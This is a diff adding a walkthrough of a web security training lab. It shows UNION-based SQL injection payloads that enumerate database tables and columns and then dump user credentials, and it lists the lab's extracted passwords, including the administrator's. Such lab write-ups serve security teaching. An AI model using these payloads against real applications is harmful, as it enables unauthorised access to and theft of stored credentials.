@@ -1,0 +1,29 @@
+[+] Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+[+] 1. Access the lab
+
+[+] 2. Click on the product category filter button
+
+[+] 3. Make sure the query is returning two columns, both of which contain text:
+'+UNION+SELECT+'abc','def'--
+
+[+] 4. Use payload to retrieve the list of tables in the database:
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+
+[+] 5. Find the name of the table containing user credentials.
+[-] Table name: users_qubosx
+
+[+] 6. Use this payload (replacing the table name) to retrieve the details of the columns in the table: 
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qubosx'--
+
+[+] 7. Find the names of the columns containing usernames and passwords.
+[-] Username: username_eccaie
+[-] Password: password_qdbyfo
+
+[+] 8. Use this payload (replacing the table and column names) to retrieve the usernames and passwords for all users: 
+'+UNION+SELECT+username_eccaie,+password_qdbyfo+FROM+users_qubosx--
+
+[+] wiener: 9l1uzp08u399sbrw5e04
+[+] carlos: wn263fj68snb16xqz7le
+
+[+] administrator: p62a5u2ivkvrg62e9xo8
